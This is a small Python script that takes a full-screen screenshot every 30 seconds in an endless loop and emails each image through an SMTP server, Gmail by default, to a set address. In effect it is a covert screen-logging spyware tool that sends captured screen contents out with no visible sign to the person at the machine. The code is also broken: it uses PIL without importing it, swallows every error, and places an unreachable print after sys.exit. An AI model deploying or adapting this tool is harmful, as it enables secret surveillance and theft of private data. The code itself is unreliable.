#------------------------------
#
#Program by Kirill Z. Aka Dixcoder;
#
#Version    Date         Info
#1.0        18.03.2018   Make screenshot&send it to your email.
#
#------------------------------



import sys, smtplib, pyautogui, time
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart

#Define data
send_to = 'SEND_TO@EMAIL.COM'       #email to send
user_email = 'USER_EMAIL@EMAIL.COM' #your email
user_password = 'PASSWORD'          #your password
smtpserver = 'smtp.gmail.com'       #smtp server, gmail is recomended
smtpport = 587                      #smtp server's port
delay = 30                          #delay between sending emails in seconds

class SCSender:
    #make image0.png
    def make_screenshot(self):
        image0 = PIL.ImageGrab.grab()
        image0.save('image0.png')
    #make email
    def make_email(self):
        self.date = time.strftime("%Y-%m-%d; %H:%M:%S;", time.localtime())
        self.msgRoot = MIMEMultipart('related')
        self.msgRoot['From'] = user_email
        self.msgRoot['To'] = send_to
        self.msgRoot['Subject'] = 'SCSender'
        self.msgAlternative = MIMEMultipart('alternative')
        self.msgText = MIMEText(self.date)
        self.msgAlternative.attach(self.msgText)
        self.msgRoot.attach(self.msgAlternative)
        self.file = open('image0.png', 'rb')
        self.msgImage = MIMEImage(self.file.read())
        self.file.close()
        self.msgImage.add_header('Content-ID', '<image0>')
        self.msgRoot.attach(self.msgImage)
    #send email
    def send_email(self):
        try:
            server = smtplib.SMTP(smtpserver, smtpport)
            server.starttls()
            server.login(user_email, user_password)
            server.sendmail(user_email, send_to, self.msgRoot.as_string())
            server.quit()
        except:
            sys.exit()
            print('Somefing went wrong.')



#-------------------------main----------------------------#

main = SCSender()
while True:
    main.make_screenshot()
    main.make_email()
    main.send_email()
    time.sleep(delay)













